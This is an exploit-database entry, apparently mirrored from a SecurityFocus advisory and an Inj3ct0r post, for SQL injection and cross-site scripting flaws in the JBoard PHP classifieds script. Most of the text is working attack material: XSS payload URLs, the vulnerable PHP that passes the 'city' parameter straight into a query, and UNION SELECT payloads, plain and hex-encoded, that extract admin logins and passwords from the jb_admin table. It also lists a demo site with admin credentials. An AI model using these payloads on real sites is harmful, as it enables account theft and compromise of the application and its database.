@@ -1,0 +1,132 @@
+source: http://www.securityfocus.com/bid/42425/info
+
+JBoard is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+JBoard 0.2 is vulnerable; prior versions may also be affected.
+
+================================================
+JBoard <= 2.0 Commercial Version Sql/Xss Exploit
+================================================
+
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] Support e-mail  : submit[at]inj3ct0r.com
+#[+] Visit : inj3ct0r.com , inj3ct0r.org , inj3ct0r.net
+
+
+Site product: http://allpublication.ru/
+Demo: http://allpublication.ru/board/demo/
+admin; admin
+Version: 2.0
+
+-----------------------------------------------------------------
+
+Xss Exploit:
+
+editform.php?notice=<script>alert(&#039;www.example.com&#039;)</script>
+
+*?user_title=</title><script>alert(&#039;www.example.org&#039;)</script>
+
+*any pages because vulnerability in inc/head.inc.php
+
+core/edit_user_message.php?edit_user_message="><script>alert(www.example.net)</script><noscript>
+
+------------------------------------------------------------------
+
+
+SQL-Inj3ct0r Exploit:  
+
+1) sboard.php
+
+elseif (!@$_GET[&#039;id_mess&#039;] && !@$_GET[&#039;id_cat&#039;] && (@$_GET[&#039;op&#039;] == "all_cat" || @$_GET[&#039;city&#039;])) require_once("core/all_cat.php");
+
+2) all_cat.php
+
+if ($c[&#039;print_top&#039;] == "yes") require_once("inc/top_add.inc.php"); 
+
+3) top_add.inc.php
+
+There is a request to the database with the parameter $_GET[&#039;city&#039;], which is never filtered
+
+if (@$_GET[&#039;city&#039;]) 
+{ 
+    $from_city_query = mysql_query ("SELECT city_name FROM jb_city WHERE city_translit = &#039;".$_GET[&#039;city&#039;]."&#039; LIMIT 1");  
+    if (mysql_num_rows ($from_city_query) == 1) 
+    { 
+        $from_city = mysql_fetch_assoc ($from_city_query); 
+        $city_from_search = " AND city = &#039;".$from_city[&#039;city_name&#039;]."&#039; "; 
+
+The result is used in the second query:
+
+ $top_add = mysql_query ("SELECT A.id as board_id, A.*, B.* FROM jb_board as A, jb_board_cat as B WHERE A.id_category = B.id AND old_mess = &#039;old&#039; ".@$city_from_search." ORDER by hits DESC LIMIT $limit");  
+if (mysql_num_rows($top_add)) 
+{ 
+?> 
+
+<H4><?=$lang[610]?></H4> 
+<table border="0" class="GRayBox" cellpadding="0" cellspacing="0"> 
+  <tr class="top"> 
+    <td class="img1">&nbsp;</td> 
+    <td class="img2">&nbsp;</td> 
+    <td class="img3">&nbsp;</td> 
+  </tr> 
+  <tr> 
+    <td class="imgL">&nbsp;</td> 
+    <td class="t"><a href="#"> 
+      <? 
+    while ($top = mysql_fetch_assoc ($top_add)) 
+    { 
+        $tip = str_replace("\r\n"," ", htmlspecialchars($top[&#039;text&#039;])); 
+        echo "<a href=\"".$h."/advertisement/nesting/".$top[&#039;id_category&#039;]."/kind/".$top[&#039;board_id&#039;]."/\" onmouseover=\"Tip(&#039;".$tip."&#039;)\"><strong>".$top[&#039;title&#039;]."</strong></a>"; 
+
+
+Request number 1:
+
+a &#039;UNION SELECT 1 --
+
+Request number 2:
+
+a &#039;UNION SELECT 1,2,3,4,5,6, concat_ws (0x3,login,password), 8,9,10,1 1,12,13,14,15,16,17,18,19, 20,21,22,23,24,25,26,27, 28,29,30,31,32,33,34 FROM jb_admin --
+Transferred to the number (* 16):
+0x612720554e494f4e2053454c45435420312c322c332c342c352c362c636f6e6361745f7773283078332c6c6f67696e2c70617373776f7264292c382c392c31302c31312c31322c31332c31342c31352c31362c31372c31382c31392c32302c32312c32322c32332c32342c32352c32362c32372c32382c32392c33302c33312c33322c33332c33342046524f4d206a625f61646d696e202d2d20
+
+As a result, we obtain the following query:
+
+sboard.php?city=a&#039;+union+select+0x612720554e494f4e2053454c45435420312c322c332c342c352c362c636f6e6361 745f7773283078332c6c6f67696e2c70617373776f7264292c 382c392c31302c31312c31322c31332c31342c31352c31362c 31372c31382c31392c32302c32312c32322c32332c32342c32 352c32362c32372c32382c32392c33302c33312c33322c3333 2c33342046524f4d206a625f61646d696e202d2d20% 20 -% 20
+
+-------------------------------------------------------------------
+
+SQL-Inj3ct0r Exploit:
+
+POST request to /core/select.php
+
+aaaaaaa &#039;UNION SELECT 1,2, concat_ws (0x3, login, password), 4,5,6 FROM jb_admin --
+Output will be the last element of the drop-down
+A vulnerable piece of code: paste the whole file)
+
+---------------------------------
+
+ThE End =]  Visit my proj3ct  :
+
+http://inj3ct0r.com
+http://inj3ct0r.org
+http://inj3ct0r.net
+
+
+# ~  - [ [ : Inj3ct0r : ] ]
